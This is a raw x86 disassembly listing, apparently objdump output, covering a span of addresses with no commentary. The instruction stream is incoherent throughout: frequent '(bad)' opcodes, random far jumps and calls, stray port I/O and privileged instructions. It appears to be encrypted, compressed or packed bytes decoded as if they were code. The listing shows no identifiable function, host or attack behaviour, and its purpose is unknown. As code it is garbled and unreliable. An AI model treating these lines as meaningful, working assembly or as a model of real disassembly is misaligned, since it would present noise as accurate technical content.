  42271a:	(bad)  
  42271b:	sbb    al,0x7b
  42271d:	dec    eax
  42271e:	pop    esp
  42271f:	and    al,0x25
  422721:	jno    0x4226fb
  422723:	xor    eax,0x810f1ecb
  422728:	cmp    ebx,edi
  42272a:	xchg   BYTE PTR [edx-0x4e76914e],ah
  422730:	sbb    BYTE PTR [ebp+0x77a3e41f],bh
  422736:	into   
  422737:	mov    ah,0x7
  422739:	sbb    DWORD PTR [esi],edx
  42273b:	fldenv [ebp+0x81d430b]
  422741:	mov    eax,ds:0x741f96a0
  422746:	cmp    eax,0x50103d3d
  42274b:	mov    ebp,0xe0ead579
  422750:	push   esi
  422751:	stos   BYTE PTR es:[edi],al
  422752:	inc    edi
  422753:	sub    dl,bl
  422755:	adc    eax,0x82a48cb4
  42275a:	sub    eax,0xd2cbf61f
  42275f:	loope  0x42276a
  422761:	arpl   WORD PTR [ebx-0x29a80e25],ax
  422767:	push   ecx
  422768:	(bad)  
  422769:	repnz es mov ebp,0xa0e22c97
  422770:	pop    ebp
  422771:	add    DWORD PTR [ebx+0x61],ecx
  422774:	mov    esp,0xd2cb878b
  422779:	push   eax
  42277a:	shr    DWORD PTR [ebx-0x170c5f16],0x3a
  422781:	leave  
  422782:	add    eax,esp
  422784:	es ret 0xa2e0
  422788:	pop    ds
  422789:	enter  0x44ea,0x4c
  42278d:	lods   al,BYTE PTR ds:[esi]
  42278e:	xor    DWORD PTR [edx-0x32],edx
  422791:	mov    eax,ds:0x998bf867
  422796:	push   cs
  422797:	push   cs
  422798:	(bad)  
  42279a:	ins    BYTE PTR es:[edi],dx
  42279b:	iret   
  42279c:	inc    eax
  42279d:	inc    ecx
  42279e:	nop
  42279f:	sub    eax,0x3db9aa52
  4227a4:	scas   al,BYTE PTR es:[edi]
  4227a5:	inc    edx
  4227a6:	inc    esi
  4227a7:	mov    ah,BYTE PTR [eax+0x3bbcdab5]
  4227ad:	retf   
  4227ae:	push   cs
  4227af:	jmp    0xd2542853
  4227b4:	sbb    BYTE PTR ds:0x79b994d7,cl
  4227ba:	div    BYTE PTR [edx]
  4227bc:	pop    esp
  4227bd:	dec    ebp
  4227be:	or     bl,BYTE PTR [eax-0x76]
  4227c1:	les    edi,FWORD PTR [ebx]
  4227c3:	sbb    BYTE PTR [eax-0x16fc6dc1],al
  4227c9:	or     DWORD PTR [edx+0x78fbc3dc],edi
  4227cf:	ror    DWORD PTR ds:0x3f5ac954,1
  4227d5:	mov    edx,0xc9c548c4
  4227da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227db:	pop    ebp
  4227dc:	scas   al,BYTE PTR es:[edi]
  4227dd:	jbe    0x42283e
  4227df:	out    dx,eax
  4227e0:	inc    ecx
  4227e1:	or     eax,0x115762d
  4227e6:	iret   
  4227e7:	nop
  4227e8:	in     eax,0x24
  4227ea:	pop    ss
  4227eb:	in     eax,0x82
	...
  4227f9:	add    BYTE PTR [eax-0x11],cl
  4227fc:	ja     0x422869
  4227fe:	idiv   ebx
  422800:	pop    esp
  422801:	out    dx,eax
  422802:	cmp    DWORD PTR [ecx-0x1a981df0],ebx
  422808:	adc    eax,0x1a2b8b4
  42280d:	add    bl,bh
  42280f:	add    DWORD PTR [eax],eax
  422811:	add    BYTE PTR ds:0xf62564de,bl
  422817:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422818:	adc    cl,BYTE PTR [edx]
  42281a:	imul   ebp,DWORD PTR [esi+0x1e9fc408],0x77f76368
  422824:	or     ch,BYTE PTR [edx-0xd]
  422827:	add    bh,ch
  422829:	xlat   BYTE PTR ds:[ebx]
  42282a:	ds sbb eax,0x256551a4
  422830:	pop    ebp
  422831:	inc    edi
  422832:	and    ah,0xa8
  422835:	xchg   ebp,eax
  422836:	lods   eax,DWORD PTR ds:[esi]
  422837:	and    eax,0x39c25d4a
  42283c:	jae    0x42286a
  42283e:	add    ecx,eax
  422840:	(bad)  
  422841:	out    dx,eax
  422842:	loopne 0x42285e
  422844:	das    
  422845:	add    al,0x7d
  422847:	mov    al,0xf
  422849:	jns    0x422832
  42284b:	mov    ds:0xef61acec,al
  422850:	stos   BYTE PTR es:[edi],al
  422851:	shl    DWORD PTR [edx+0x1d],1
  422854:	retf   0x8ea9
  422857:	push   0x18
  422859:	sahf   
  42285a:	xchg   DWORD PTR [ebx],esi
  42285c:	fistp  QWORD PTR [esi+eax*2-0x6e]
  422860:	cmp    BYTE PTR [edx+0x7831fc3],cl
  422866:	mov    ch,0xa1
  422868:	pop    edx
  422869:	and    DWORD PTR [ebp-0x1f9d1f84],esi
  42286f:	mov    esi,0x7c2d1d93
  422874:	clc    
  422875:	jecxz  0x422899
  422877:	jmp    0xb65:0xf5fd6839
  42287e:	bound  eax,QWORD PTR [edi+0x64]
  422881:	cmp    dh,BYTE PTR [edi+0xf]
  422884:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422885:	lock xor al,0xc1
  422888:	(bad)  
  42288a:	fdiv   DWORD PTR [eax]
  42288c:	lea    ebp,[ecx+ecx*8+0x7d]
  422890:	jl     0x42283c
  422892:	mov    bh,0x1
  422894:	cmp    ebp,esi
  422896:	shr    BYTE PTR [edx+0x28b001e1],1
  42289c:	or     al,0xbc
  42289e:	inc    esp
  42289f:	adc    eax,0x9b6e2196
  4228a4:	inc    ebp
  4228a5:	xchg   BYTE PTR [edi+esi*8],ah
  4228a8:	or     ch,bl
  4228aa:	push   ds
  4228ab:	push   esi
  4228ac:	outs   dx,BYTE PTR ds:[esi]
  4228ad:	fstp   QWORD PTR [edx-0x78287edf]
  4228b3:	sbb    bh,cl
  4228b5:	loop   0x4228bf
  4228b7:	jge    0x4228e2
  4228b9:	test   BYTE PTR [edi+0xaf7de46],0xfc
  4228c0:	push   edx
  4228c1:	adc    BYTE PTR [ecx],al
  4228c3:	sahf   
  4228c4:	lock out dx,eax
  4228c6:	aam    0x81
  4228c8:	and    al,0x19
  4228ca:	(bad)
  4228cd:	cmp    ecx,DWORD PTR [eax+0x28]
  4228d0:	lahf   
  4228d1:	jle    0x42285f
  4228d3:	mov    al,es:0x7242a36a
  4228d9:	xsha256 (bad)
  4228da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228db:	xchg   esp,eax
  4228dc:	mov    ebx,DWORD PTR [ebp-0x2d]
  4228df:	mov    bl,0xe2
  4228e1:	add    dh,BYTE PTR [ecx]
  4228e3:	or     al,0xaf
  4228e5:	xor    dl,dl
  4228e7:	xlat   BYTE PTR ds:[ebx]
  4228e8:	jbe    0x42289e
  4228ea:	pop    ebx
  4228eb:	sub    al,0x99
  4228ed:	aaa    
  4228ee:	jp     0x422882
  4228f0:	arpl   WORD PTR [esp+ecx*8-0x3c],cx
  4228f4:	or     BYTE PTR [edi-0x68],dl
  4228f7:	xlat   BYTE PTR ds:[ebx]
  4228f8:	and    BYTE PTR [edx+ebx*8+0x4b],bh
  4228fc:	leave  
  4228fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228fe:	push   eax
  4228ff:	mov    bh,0x3b
  422901:	pop    ss
  422902:	fnstsw WORD PTR [ebx-0x131f1969]
  422908:	loopne 0x422917
  42290a:	add    eax,0x37674190
  42290f:	adc    BYTE PTR [edx+0x54],ah
  422912:	pop    esi
  422913:	adc    DWORD PTR [edx+0x17],esi
  422916:	(bad)  
  422917:	call   0x4739:0x9318d67b
  42291e:	test   cl,dl
  422920:	add    bl,BYTE PTR [ebx]
  422922:	sbb    bl,BYTE PTR [ecx]
  422924:	mov    ds:0xdbb924d7,al
  422929:	inc    esp
  42292a:	in     al,0x1e
  42292c:	leave  
  42292d:	fstp   DWORD PTR [ecx]
  42292f:	mov    BYTE PTR [ebp-0x18e1f02b],ch
  422935:	shl    BYTE PTR [ebp+0x68],cl
  422938:	test   al,0xbd
  42293a:	add    dl,dl
  42293c:	fidivr DWORD PTR [ebx]
  42293e:	je     0x4229b4
  422940:	ins    BYTE PTR es:[edi],dx
  422941:	in     al,dx
  422942:	xor    eax,ebx
  422944:	sti    
  422945:	(bad)  
  422946:	pop    edi
  422947:	shr    ebp,1
  422949:	outs   dx,BYTE PTR ds:[esi]
  42294a:	push   ds
  42294b:	xchg   ah,cl
  42294d:	addr16 pop ecx
  42294f:	mov    eax,0x5b3582a6
  422954:	in     eax,dx
  422955:	ins    BYTE PTR es:[edi],dx
  422956:	dec    edx
  422957:	jmp    0x5bcc:0x782ad046
  42295e:	arpl   WORD PTR [eax],sp
  422960:	(bad)  
  422961:	push   edi
  422962:	sbb    esp,DWORD PTR [ecx+0x4c]
  422965:	add    al,0xbb
  422967:	inc    edx
  422968:	mov    BYTE PTR [ebp-0x53],cl
  42296b:	jno    0x4229d2
  42296d:	push   edi
  42296e:	aas    
  42296f:	dec    ebp
  422970:	mov    eax,ds:0x99345caf
  422975:	call   0x1565e496
  42297a:	test   al,0x10
  42297c:	loop   0x4229f0
  42297e:	cmc    
  42297f:	cmp    eax,DWORD PTR cs:[ebx]
  422982:	push   ebp
  422983:	jmp    0x42293f
  422985:	or     BYTE PTR [esi-0x14],al
  422988:	scas   eax,DWORD PTR es:[edi]
  422989:	or     al,0x3
  42298b:	xor    ecx,DWORD PTR [edi-0x1686b1dd]
  422991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422992:	je     0x42293c
  422994:	mov    ebp,DWORD PTR [eax+0x2]
  422997:	cmp    dh,ah
  422999:	adc    DWORD PTR [ebx+0x67f39008],edi
  42299f:	test   eax,esi
  4229a1:	inc    ecx
  4229a2:	in     eax,dx
  4229a3:	or     ebp,DWORD PTR [ecx]
  4229a5:	mov    dh,0xd7
  4229a7:	dec    ebp
  4229a8:	cmp    DWORD PTR [esi],0x2c
  4229ab:	pop    eax
  4229ac:	dec    ebp
  4229ad:	jmp    0x39a18c45
  4229b2:	mov    ecx,DWORD PTR ds:0x752c5772
  4229b8:	pop    esp
  4229b9:	not    DWORD PTR ds:0xd4c5b334
  4229bf:	punpcklbw mm1,mm0
  4229c2:	loopne 0x422a22
  4229c4:	cdq    
  4229c5:	jl     0x4229ff
  4229c7:	shr    BYTE PTR [ebx+0x6d],1
  4229ca:	mov    al,0x19
  4229cc:	cmp    dh,al
  4229ce:	shr    bh,1
  4229d0:	arpl   WORD PTR [ebx+0x75933dc7],bp
  4229d6:	push   ecx
  4229d7:	jmp    DWORD PTR [eax+0x2a1ee3b7]
  4229dd:	cmp    bl,BYTE PTR ds:0xecfd82f0
  4229e3:	push   ebp
  4229e4:	dec    edx
  4229e5:	dec    esp
  4229e6:	lock mov dl,0xe8
  4229e9:	ret    
  4229ea:	int3   
  4229eb:	lods   al,BYTE PTR ds:[esi]
  4229ec:	fcmovbe st,st(4)
  4229ee:	stos   DWORD PTR es:[edi],eax
  4229ef:	cmp    al,0xbc
  4229f1:	inc    edi
  4229f2:	inc    esp
  4229f3:	movzx  edi,WORD PTR [eax+0x338765b5]
  4229fa:	mov    dh,0xa
  4229fc:	xlat   BYTE PTR ds:[ebx]
  4229fd:	mov    al,al
  4229ff:	mov    ebp,0xa125f185
  422a04:	(bad)  
  422a05:	out    dx,al
  422a06:	enter  0xa489,0xfe
  422a0a:	ds cwde 
  422a0c:	les    eax,FWORD PTR [eax]
	...
  422a1a:	mov    al,0xe3
  422a1c:	pop    edx
  422a1d:	jecxz  0x422a7a
  422a1f:	sti    
  422a20:	mov    ecx,0xeb2b3af3
  422a25:	inc    ecx
  422a26:	or     DWORD PTR [edx],esi
  422a28:	jge    0x4229b7
  422a2a:	mov    bl,0xa4
  422a2c:	add    DWORD PTR [eax],eax
  422a2e:	sti    
  422a2f:	add    DWORD PTR [eax],eax
  422a31:	add    BYTE PTR [edi+eiz*1+0x489c49d4],dl
  422a38:	cs pop eax
  422a3a:	push   edx
  422a3b:	sbb    eax,0x17e6cc2b
  422a40:	mov    ebx,0x15cd3431
  422a45:	nop
  422a46:	mov    al,0xcf
  422a48:	imul   esi,DWORD PTR [ebp-0x7d],0x33e42d4a
  422a4f:	cmc    
  422a50:	jg     0x422a6f
  422a52:	mov    bh,0xd7
  422a54:	add    ecx,ecx
  422a56:	xchg   DWORD PTR [edx],edi
  422a58:	push   ebp
  422a59:	or     dl,BYTE PTR [ecx-0x1d]
  422a5c:	xchg   DWORD PTR [ebx],esp
  422a5e:	es in  al,0x19
  422a61:	fs sbb ebp,ebx
  422a64:	hlt    
  422a65:	stos   DWORD PTR es:[edi],eax
  422a66:	pop    ecx
  422a67:	ret    
  422a68:	es scas al,BYTE PTR es:[edi]
  422a6a:	call   0x3ec8:0x30e53d3e
  422a71:	jmp    0xa2ef9d65
  422a76:	push   0x14
  422a78:	adc    DWORD PTR gs:[eax+ebx*8],edx
  422a7c:	inc    ebx
  422a7d:	push   ds
  422a7e:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  422a80:	mov    dl,0xce
  422a82:	push   esp
  422a83:	add    esp,ecx
  422a85:	dec    eax
  422a86:	fcom   QWORD PTR [ebx-0x4a579c5c]
  422a8c:	les    ecx,FWORD PTR [ebx]
  422a8e:	data16 xchg bh,al
  422a91:	push   cs
  422a92:	arpl   di,ax
  422a94:	add    DWORD PTR [edi],0x6c
  422a97:	nop
  422a98:	sar    BYTE PTR [eax+0x10],1
  422a9b:	inc    ebp
  422a9c:	pop    edx
  422a9d:	(bad)  
  422a9e:	sub    DWORD PTR [ecx],eax
  422aa0:	inc    ebp
  422aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422aa2:	mov    bl,0xc4
  422aa4:	out    0x88,al
  422aa6:	and    BYTE PTR [edi-0x76fda5c6],dl
  422aac:	push   ds
  422aad:	adc    ch,cl
  422aaf:	fidivr DWORD PTR [esi+0x343881e4]
  422ab5:	stc    
  422ab6:	pop    ss
  422ab7:	sbb    BYTE PTR [edx+0x25],0x37
  422abb:	xchg   edi,eax
  422abc:	outs   dx,BYTE PTR ds:[esi]
  422abd:	pop    ecx
  422abe:	fidiv  DWORD PTR [edi-0x29]
  422ac1:	std    
  422ac2:	in     eax,dx
  422ac3:	(bad)  
  422ac5:	inc    ebp
  422ac6:	bound  eax,QWORD PTR [esi+0x7]
  422ac9:	push   edx
  422aca:	retf   
  422acb:	cmp    DWORD PTR [eax+edi*8-0x76ffe6b4],eax
  422ad2:	test   BYTE PTR [ebx+0x15],ah
  422ad5:	and    DWORD PTR [ebx+edx*2+0x357e1fa3],ecx
  422adc:	jb     0x422a8a
  422ade:	add    al,0x8e
  422ae0:	mov    edx,0x376f21e7
  422ae5:	retf   
  422ae6:	push   edi
  422ae7:	aaa    
  422ae8:	lds    eax,FWORD PTR [ecx-0x160960]
  422aee:	rcr    BYTE PTR [edi-0x29],1
  422af1:	es pop ds
  422af3:	icebp  
  422af4:	xchg   DWORD PTR [esi-0x31404e43],esi
  422afa:	nop
  422afb:	xor    dh,BYTE PTR [edx-0x381af615]
  422b01:	popf   
  422b02:	lods   al,BYTE PTR ds:[esi]
  422b03:	xlat   BYTE PTR ds:[ebx]
  422b04:	stc    
  422b05:	jbe    0x422b24
  422b07:	mov    ebx,0xfebfcbf
  422b0c:	fnstcw WORD PTR [edi+ecx*1-0x4b73e024]
  422b13:	inc    eax
  422b14:	test   ecx,esp
  422b16:	jle    0x422acf
  422b18:	fwait
  422b19:	lods   eax,DWORD PTR ds:[esi]
  422b1a:	push   eax
  422b1b:	fnstsw WORD PTR [ebx-0x65c14f3e]
  422b21:	push   es
  422b22:	fiadd  WORD PTR [edi]
  422b24:	mov    edi,0xa029d55d
  422b29:	call   0x294:0x8694d429
  422b30:	aam    0xf1
  422b32:	rol    DWORD PTR [ebx],0x42
  422b35:	or     BYTE PTR [edi-0xe],ch
  422b38:	jno    0x422b56
  422b3a:	fwait
  422b3b:	xor    ah,BYTE PTR [ebp+0x1a]
  422b3e:	les    edi,FWORD PTR [eax+0x55699c42]
  422b44:	aad    0x70
  422b46:	js     0x422b36
  422b48:	ds and al,0x10
  422b4b:	push   ebx
  422b4c:	pop    ebp
  422b4d:	pop    ebx
  422b4e:	sahf   
  422b4f:	loope  0x422b25
  422b51:	pop    edx
  422b52:	mov    ah,0xa9
  422b54:	jmp    0x422bb5
  422b56:	or     eax,0xc0fda08a
  422b5b:	mov    ebx,0xb0beb46f
  422b60:	out    dx,eax
  422b61:	iret   
  422b62:	in     al,dx
  422b63:	arpl   cx,dx
  422b65:	ja     0x422bdb
  422b67:	mov    DWORD PTR [edi+0x14],esi
  422b6a:	bound  edi,QWORD PTR [esi]
  422b6c:	inc    eax
  422b6d:	shr    BYTE PTR [ebx+0x6f],cl
  422b70:	inc    ebp
  422b71:	cmp    eax,0xa93df7ea
  422b76:	xchg   esp,eax
  422b77:	adc    al,0xb1
  422b79:	ret    0xc1dc
  422b7c:	mov    al,BYTE PTR ds:0xf38ebe25
  422b82:	push   eax
  422b83:	add    eax,0xe5bb66d3
  422b88:	pop    eax
  422b89:	or     al,0x4f
  422b8b:	mov    al,0x37
  422b8d:	dec    edx
  422b8e:	and    cl,BYTE PTR [edi]
  422b90:	in     al,dx
  422b91:	lods   eax,DWORD PTR ds:[esi]
  422b92:	in     eax,dx
  422b93:	js     0x422b50
  422b95:	mov    ebp,0xdf5f5b4a
  422b9a:	mov    al,ds:0x5d0c252d
  422b9f:	xchg   esi,eax
  422ba0:	(bad)  
  422ba1:	ins    BYTE PTR es:[edi],dx
  422ba2:	in     al,0x27
  422ba4:	add    eax,0xd91db4d9
  422ba9:	rcr    BYTE PTR [ebx+esi*2],0x5b
  422bad:	sbb    eax,0x25a6aa00
  422bb2:	and    BYTE PTR [ebx+esi*2],ch
  422bb5:	xchg   esp,eax
  422bb6:	mov    al,0x48
  422bb8:	(bad)  
  422bba:	enter  0x485d,0x78
  422bbe:	cwde   
  422bbf:	dec    esp
  422bc0:	adc    bl,BYTE PTR [esi+eax*2]
  422bc3:	daa    
  422bc4:	lea    ebx,[ecx-0x1a]
  422bc7:	sub    ebp,DWORD PTR ds:0x5984f296
  422bcd:	gs jmp 0x6d7705f7
  422bd3:	jmp    0x22a6:0x10215553
  422bda:	stos   DWORD PTR es:[edi],eax
  422bdb:	pop    ebp
  422bdc:	pop    es
  422bdd:	sar    DWORD PTR [ecx+0x6],0xb9
  422be1:	mov    eax,0xac5fc50f
  422be6:	addr16 int 0xfa
  422be9:	js     0x422bc6
  422beb:	inc    ebx
  422bec:	push   edx
  422bed:	stc    
  422bee:	and    cl,BYTE PTR [ecx]
  422bf0:	push   es
  422bf1:	arpl   WORD PTR [eax+0x6105badc],sp
  422bf7:	sub    BYTE PTR [edi-0x767bcf1b],ch
  422bfd:	xchg   ebp,eax
  422bfe:	pop    eax
  422bff:	mul    BYTE PTR [esi+edi*1]
  422c02:	push   ebx
  422c03:	sbb    dl,BYTE PTR [edi+0x5d972b81]
  422c09:	imul   edi,esp,0x8934195d
  422c0f:	pop    ss
  422c10:	daa    
  422c11:	mov    bh,0x8a
  422c13:	(bad)  
  422c14:	arpl   WORD PTR [edi+0x15],dx
  422c17:	sti    
  422c18:	sbb    al,0x2c
  422c1a:	cmp    dh,BYTE PTR [esi+0x2c]
  422c1d:	fisubr DWORD PTR [eax+0x4fe87917]
  422c23:	ret    
  422c24:	scas   al,BYTE PTR es:[edi]
  422c25:	les    ebp,FWORD PTR [esi-0x9ca13d]
  422c2b:	dec    ebp
  422c2c:	sub    eax,DWORD PTR [eax]
	...
  422c3a:	xor    eax,0xbf06168e
  422c3f:	sahf   
  422c40:	xor    eax,0x913f27bf
  422c45:	sub    edx,DWORD PTR [ecx-0x51c0a112]
  422c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c4c:	add    DWORD PTR [eax],eax
  422c4e:	sti    
  422c4f:	add    DWORD PTR [eax],eax
  422c51:	add    BYTE PTR [esi],ah
  422c53:	and    al,0xa1
  422c55:	xor    ch,BYTE PTR [edi-0x20]
  422c58:	adc    esi,DWORD PTR [ebx+0x3c]
  422c5b:	in     al,dx
  422c5c:	xor    al,0x1e
  422c5e:	cmc    
  422c5f:	aas    
  422c60:	test   al,0x97
  422c62:	push   ebx
  422c63:	inc    ebp
  422c64:	loope  0x422c95
  422c66:	ffree  st(2)
  422c68:	stos   BYTE PTR es:[edi],al
  422c69:	(bad)
  422c6d:	loopne 0x422c4b
  422c6f:	inc    ecx
  422c70:	mov    dh,0x0
  422c73:	fst    DWORD PTR [edx+0x7a]
  422c76:	repz push 0x1cc0368f
  422c7c:	jnp    0x422c39
  422c7e:	inc    ebp
  422c7f:	mov    eax,0x90562e88
  422c84:	sub    BYTE PTR ds:0xc5b8969a,0xbc
  422c8b:	xchg   edx,eax
  422c8c:	pop    ecx
  422c8d:	mov    bl,0xf6
  422c8f:	jmp    0x532f:0x22a79999
  422c96:	sahf   
  422c97:	cmc    
  422c98:	fadd   DWORD PTR [eax+edi*4-0x34]
  422c9c:	loop   0x422d16
  422c9e:	lahf   
  422c9f:	inc    ebp
  422ca0:	mov    ?,WORD PTR [ecx]
  422ca2:	shl    BYTE PTR [ebx+0x23176d5],1
  422ca8:	sub    al,0x34
  422caa:	sar    BYTE PTR [ebx+0xe],cl
  422cad:	mov    edi,0x39ba302b
  422cb2:	fidiv  DWORD PTR [ebx]
  422cb4:	popf   
  422cb5:	and    al,0xe
  422cb7:	xchg   dl,ah
  422cb9:	mov    dh,0x61
  422cbb:	mov    bl,0x32
  422cbd:	lahf   
  422cbe:	shr    dl,1
  422cc0:	and    eax,0x9d657945
  422cc5:	cmp    ecx,DWORD PTR [edi+edi*4+0x2d6cbaab]
  422ccc:	jmp    0x422d47
  422cce:	scas   al,BYTE PTR es:[edi]
  422ccf:	inc    edx
  422cd0:	add    edx,esp
  422cd2:	lock jb 0x422d31
  422cd5:	and    eax,0xf8d8d8c5
  422cda:	jns    0x422c74
  422cdc:	ins    DWORD PTR es:[edi],dx
  422cdd:	push   0xa2c50827
  422ce2:	xchg   ebx,eax
  422ce3:	(bad)  
  422ce4:	push   ds
  422ce5:	jecxz  0x422d13
  422ce7:	daa    
  422ce8:	push   ss
  422ce9:	or     eax,0xf250d9a8
  422cee:	aad    0xb2
  422cf0:	pop    esp
  422cf1:	fldenv [ebp-0x4a]
  422cf4:	xor    DWORD PTR [edx],esi
  422cf6:	mov    bl,0x83
  422cf8:	xor    DWORD PTR [esp+edx*2-0x74],eax
  422cfc:	out    0xc,al
  422cfe:	sahf   
  422cff:	mov    ds:0xd2ae793c,al
  422d04:	dec    ebp
  422d05:	pop    ds
  422d06:	adc    DWORD PTR [esi-0x4f],edx
  422d09:	ret    0xaf18
  422d0c:	ss icebp 
  422d0e:	mov    al,0x77
  422d10:	hlt    
  422d11:	push   eax
  422d12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d13:	xlat   BYTE PTR ds:[ebx]
  422d14:	jnp    0x422d2a
  422d16:	mov    esp,0xbdfb7cb3
  422d1b:	jno    0x422d33
  422d1d:	fstp   DWORD PTR [edx+edi*4+0x55f28985]
  422d24:	xchg   edi,eax
  422d25:	pop    ax
  422d27:	xlat   BYTE PTR ds:[ebx]
  422d28:	int    0x5d
  422d2a:	aam    0xc3
  422d2c:	pop    edx
  422d2d:	and    al,BYTE PTR ds:0x9a11e19f
  422d33:	adc    al,0xdb
  422d35:	mov    ebp,0x8ec1802e
  422d3a:	je     0x422d14
  422d3c:	adc    eax,0xbd6d12ac
  422d41:	clc    
  422d42:	jnp    0x422ccf
  422d44:	mov    esp,0x59cd861
  422d49:	inc    eax
  422d4a:	mov    ds:0xfd126b3f,al
  422d4f:	mov    BYTE PTR [ebp+eiz*4-0x4c9859ef],bl
  422d56:	stos   BYTE PTR es:[edi],al
  422d57:	mov    bl,0x35
  422d59:	pop    ecx
  422d5a:	or     al,0x6e
  422d5c:	xor    DWORD PTR [esi+0x3e39a47],ebx
  422d62:	pop    esp
  422d63:	stos   BYTE PTR es:[edi],al
  422d64:	pop    ss
  422d65:	add    al,0xae
  422d67:	jo     0x422d7e
  422d69:	stos   BYTE PTR es:[edi],al
  422d6a:	jbe    0x422d36
  422d6c:	jge    0x422d48
  422d6e:	outs   dx,DWORD PTR ds:[esi]
  422d6f:	mov    dh,0x30
  422d71:	sbb    DWORD PTR [ebx+eiz*8],ebp
  422d74:	hlt    
  422d75:	mov    ah,0x62
  422d77:	(bad)  
  422d78:	in     al,0x57
  422d7a:	leave  
  422d7b:	outs   dx,BYTE PTR ds:[esi]
  422d7c:	adc    esp,esp
  422d7e:	ret    0xe1a5
  422d81:	std    
  422d82:	pop    eax
  422d83:	ins    DWORD PTR es:[edi],dx
  422d84:	cmp    DWORD PTR [edx+0x5a020d0f],esi
  422d8a:	push   esi
  422d8b:	mov    eax,ds:0xfadf3309
  422d90:	idiv   dl
  422d92:	mov    bh,0xa2
  422d94:	lahf   
  422d95:	mov    al,0xde
  422d97:	mov    esi,DWORD PTR [ecx+ebp*2-0x3]
  422d9b:	pusha  
  422d9c:	xchg   BYTE PTR [ebx+ebp*8-0x1f91fd3e],dl
  422da3:	fxch   st(5)
  422da5:	cld    
  422da6:	setbe  BYTE PTR [esi-0x2c]
  422daa:	sahf   
  422dab:	jno    0x422e0c
  422dad:	outs   dx,DWORD PTR ds:[esi]
  422dae:	iret   
  422daf:	popa   
  422db0:	rcl    DWORD PTR [ecx-0x5f],cl
  422db3:	jnp    0x422d8c
  422db5:	(bad)  
  422db8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422db9:	mov    edx,0x747c9c8b
  422dbe:	aad    0xc1
  422dc0:	ror    BYTE PTR [esi],cl
  422dc2:	push   0xffffffa3
  422dc4:	imul   esi,DWORD PTR [esp+ecx*2+0x6d26cfd2],0xe566d116
  422dcf:	sar    DWORD PTR [esi+eiz*1+0x4fe6a646],cl
  422dd6:	sbb    al,0xd1
  422dd8:	mov    ecx,0x7ba745ac
  422ddd:	sub    edx,DWORD PTR [edx*1+0x6f392814]
  422de4:	or     edx,DWORD PTR [ecx+edx*8+0x23ae59da]
  422deb:	dec    ecx
  422dec:	ret    
  422ded:	popa   
  422dee:	push   ss
  422def:	stos   BYTE PTR es:[edi],al
  422df0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422df1:	les    ebp,FWORD PTR [edx-0x19]
  422df4:	dec    edi
  422df5:	mov    DWORD PTR [ebp+0x53],0xbc5aad47
  422dfc:	pop    eax
  422dfd:	mov    DWORD PTR [edx-0x77],ebx
  422e00:	mov    BYTE PTR [edx],ah
  422e02:	ret    
  422e03:	fmul   st(6),st
  422e05:	add    al,0x16
  422e07:	in     eax,0xca
  422e09:	std    
  422e0a:	in     eax,0xbe
  422e0c:	push   es
  422e0d:	mov    ch,0x77
  422e0f:	add    bh,BYTE PTR [esi]
  422e11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e12:	mov    esp,0xfbca9c02
  422e17:	jb     0x422dfb
  422e19:	and    DWORD PTR [ebp+0x42d1b65a],eax
  422e1f:	out    0x4c,al
  422e21:	sub    bl,BYTE PTR [esi+ebp*4-0x4a81eb54]
  422e28:	jo     0x422dfb
  422e2a:	stc    
  422e2b:	and    ebp,DWORD PTR [ecx+edi*4-0x79b953f2]
  422e32:	in     eax,0x70
  422e34:	loopne 0x422e89
  422e36:	div    BYTE PTR [eax-0x9845ac4]
  422e3c:	inc    BYTE PTR [esi]
  422e3e:	sbb    al,0xe9
  422e40:	outs   dx,DWORD PTR ds:[esi]
  422e41:	inc    edi
  422e42:	into   
  422e43:	mov    cl,0x10
  422e45:	jg     0x422df1
  422e47:	inc    ebp
  422e48:	cld    
  422e49:	lds    esp,FWORD PTR [ebp+0x6d]
  422e4c:	mov    al,BYTE PTR [eax]
	...
  422e5a:	stc    
  422e5b:	std    
  422e5c:	in     eax,dx
  422e5d:	mov    cl,0xed
  422e5f:	mov    cl,0xfd
  422e61:	std    
  422e62:	cmp    bl,BYTE PTR [edi+0x4607fec4]
  422e68:	int3   
  422e69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e6a:	test   eax,0xfb0001a8
  422e6f:	add    DWORD PTR [eax],eax
  422e71:	add    BYTE PTR [edi-0x73c6556f],bh
  422e77:	or     eax,0x565eb5a6
  422e7c:	jg     0x422e43
  422e7e:	out    dx,eax
  422e7f:	arpl   WORD PTR [edx-0x54],di
  422e82:	sub    eax,0x48315b1a
  422e87:	pop    edx
  422e88:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  422e8a:	out    0x59,al
  422e8c:	sub    eax,0xeb02a51f
  422e91:	je     0x422eba
  422e93:	dec    ecx
  422e94:	cmp    bh,BYTE PTR [edi-0x7ca8715c]
  422e9a:	call   0x5528:0x90e61f08
  422ea1:	xchg   DWORD PTR [eax],esp
  422ea3:	cmp    BYTE PTR [esi-0x40],0xfd
  422ea7:	div    dl
  422ea9:	leave  
  422eaa:	(bad)  
  422eab:	cmp    al,0x1d
  422ead:	dec    ebx
  422eae:	icebp  
  422eaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422eb0:	call   0x216d9070
  422eb5:	sbb    eax,0xf681f7fc
  422eba:	(bad)  
  422ebb:	mov    dh,0x3b
  422ebd:	mov    ds:0x6bd30017,eax
  422ec2:	pop    esi
  422ec3:	and    al,0xb2
  422ec5:	test   BYTE PTR ds:0x28d092be,dl
  422ecb:	mov    eax,ds:0x5737fad7
  422ed0:	or     ch,ch
  422ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ed3:	aam    0x9f
  422ed5:	loop   0x422f01
  422ed7:	(bad)  
  422ed8:	je     0x422f54
  422eda:	xlat   BYTE PTR ds:[ebx]
  422edb:	pusha  
